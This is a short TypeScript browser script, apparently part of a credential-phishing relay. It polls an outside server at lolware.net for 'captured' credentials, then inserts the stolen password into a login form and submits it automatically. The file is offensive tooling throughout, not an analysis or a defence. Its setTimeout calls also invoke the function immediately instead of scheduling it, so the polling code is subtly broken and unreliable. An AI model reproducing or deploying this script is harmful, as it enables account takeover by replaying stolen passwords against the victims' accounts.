const pollserver = (url: string) => {
  fetch(
    url + "/captured", { },
  ).then((response) => {
    if (!response.ok) {
      throw new Error("Network response returned "
          + response.status);
    }
    return response.json() as any;
  }).then((data) => {
    console.log("Retreived data: " + data);
    if (data === "none") {
      setTimeout(pollserver(url), 3000);
    } else {
      // Credentials detected - submitting form
      console.log(JSON.stringify(data));
      (document.getElementById("cred_password_inputtext") as HTMLInputElement).value =
          data["passwd"];
      (document.getElementById("credentials") as HTMLFormElement).submit();
    }
  }).catch((err) => {
    console.error(err.message);
  });
};

// Set this URL to your base address
const url = "http://lolware.net:4567";
setTimeout(pollserver(url), 3000);
